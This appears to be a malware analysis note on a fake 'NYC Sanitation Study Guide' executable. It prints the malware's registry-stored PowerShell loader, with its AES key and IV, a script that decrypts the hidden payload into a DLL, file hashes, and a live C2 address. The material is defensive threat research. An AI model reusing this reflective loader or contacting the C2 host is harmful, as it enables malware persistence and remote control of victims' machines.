### Occurrence

05-23-2023

### File Information
File: Nyc-Sanitation-Study-Guide.exe
Hash: af1f2b516ede83cf2699ba54113ce7a7d81d17040588746a19a1fa2ea41175d6
Dynamic Analysis: https://tria.ge/230522-q6gbgagg86/behavioral2

### Registry containing decryption method

```powershell
\REGISTRY\USER\S-1-5-21-4238149048-355649189-894321705-1000_Classes\fqm3y2qp1vu\shell\open\command\ = "powershell -command \"$A=New-Object System.Security.Cryptography.AesCryptoServiceProvider;$A.Key=@([byte]62,30,15,134,84,122,250,208,115,183,250,168,0,188,126,120,91,87,201,237,254,97,57,35,96,163,200,77,242,68,142,244);$A.IV=@([byte]15,138,1,202,196,91,7,147,249,50,27,42,35,91,58,138);$F=(get-itemproperty 'HKCU:\\Software\\Classes\\bysxepsbwlz').'(default)';[Reflection.Assembly]::Load($A.CreateDecryptor().TransformFinalBlock($F,0,$F.Length));$c=$null;while($true){try{$c=[hGte7wy8sZSg96YadN8LCrdzaqDdXwbKBt1Fkz7eKOTOH7F0mWPeUvyvmDsJNHs2GnW.IsEbZin2uIZw4UFcNe0bWHNFHljmSH8PzEIBdMtfBsW4BJJiofYR1QxK_Z1jmVUACyhBvVwRKipYDUYX0oVTC]::JsvzuZ7sRx8lF($c);}catch{};Start-Sleep -Seconds 20}\""	
```

### Re-creating the decryption method using the data stored in the registry

```powershell
$key = @([byte]62,30,15,134,84,122,250,208,115,183,250,168,0,188,126,120,91,87,201,237,254,97,57,35,96,163,200,77,242,68,142,244)
$iv = @([byte]15,138,1,202,196,91,7,147,249,50,27,42,35,91,58,138)
# saved hex data to a file called 'payload'
$content = Get-Content "payload" -Raw 
$encryptedBytes = new-object byte[] ($content.Length / 2)
for ($i=0;$i -lt $encryptedBytes.Length; $i++) {
    $encryptedBytes[$i] = [System.Convert]::ToByte($content.Substring($i*2, 2), 16)
}

$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor = $aes.CreateDecryptor()
$PE=$Decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length);
$aes.Dispose();
[system.io.file]::writeallbytes("payload2.dll", $PE);
```

### C2 Payload
Hash: ad88175040eec9c218961930a7a1fd7b5fcb831adbd6dbedde9c741dcdba8398
C2: `http://23.29.115.186/`
VT: https://www.virustotal.com/gui/file/ad88175040eec9c218961930a7a1fd7b5fcb831adbd6dbedde9c741dcdba8398/detection
